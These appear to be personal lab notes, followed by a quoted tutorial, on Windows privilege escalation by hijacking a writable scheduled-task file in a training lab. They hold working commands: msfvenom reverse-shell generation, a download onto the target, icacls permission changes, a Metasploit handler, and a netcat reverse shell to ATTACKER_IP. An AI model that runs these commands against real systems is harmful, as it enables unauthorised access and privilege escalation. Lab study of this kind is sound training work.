- Show all the scheduled tasks
  ```bash
  schtasks
  ```
![[Pasted image 20250910025443.png]]

- Check more details of the task of our interest
  ```bash
  # show query, task name, format option, verbose
   schtasks /query /tn vulntask /fo list /v
  ```
![[Pasted image 20250910025806.png]]
check task to run (if we have permission for it) and run as user (the user whose access we want)

- see all users have the full access of the executable
  ```bat
   icacls C:\tasks\schtask.bat
  ```
  ![[Pasted image 20250910030059.png]]

- create a reverse shell and send it to windows

```
# Attackbox
msfvenom -p windows/shell_reverse_tcp LHOST=10.17.21.72 LPORT=8080 -f exe > shell.exe

python3 -m http.server 9000

# Target
wget http://10.17.21.72:9000/shell.exe -O shell.exe


```

![[Pasted image 20250910031237.png]]
![[Pasted image 20250910031337.png]]

- change the original schtask with our shell, check its content and permission (what i did created a exe shell and asked bad to run that exe)
```bash
# grant permission if its not there
icacls shell.exe /grant "BUILTIN\Users:(F)" /T
icacls C:\tasks\shell.exe
 ```
 
![[Pasted image 20250910034647.png]]

**NOTE: THE OTHER USER SHOULD HAVE ACCESS TO RUN THE SHELL**

```bash
windows/shell_reverse_tcp LHOST=10.17.21.72 LPORT=8080 -f exe > shell.exe
python3 -m http.server 9000
msfconsole
set payload windows/shell_reverse_tcp
msf exploit(multi/handler) > set lhost 10.17.21.72
msf exploit(multi/handler) > set lport 8080
msf exploit(multi/handler) > run

```

![[Pasted image 20250910033321.png]]

![[Pasted image 20250910033352.png]]

- start the task

```bash
schtasks /run /tn vulntask
```

![[Pasted image 20250910033412.png]]

- Got the connection
![[Pasted image 20250910034725.png]]



there was an alternate also
![[Pasted image 20250910040611.png]]
bet i think for this we need a netcat in windows



---

Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.

Scheduled tasks can be listed from the command line using the `schtasks` command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:

Command Prompt

```shell-session
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.

If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use `icacls`:

Command Prompt

```shell-session
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

As can be seen in the result, the **BUILTIN\Users** group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, `nc64.exe` can be found on `C:\tools`. Let's change the bat file to spawn a reverse shell:

Command Prompt

```shell-session
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

We then start a listener on the attacker machine on the same port we indicated on our reverse shell:

```shell-session
nc -lvp 4444
```

The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. While you probably wouldn't be able to start the task in a real scenario and would have to wait for the scheduled task to trigger, we have provided your user with permissions to start the task manually to save you some time. We can run the task with the following command:

Command Prompt

```shell-session
C:\> schtasks /run /tn vulntask
```

And you will receive the reverse shell with taskusr1 privileges as expected:

KaliLinux

```shell-session
user@attackerpc$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1
```





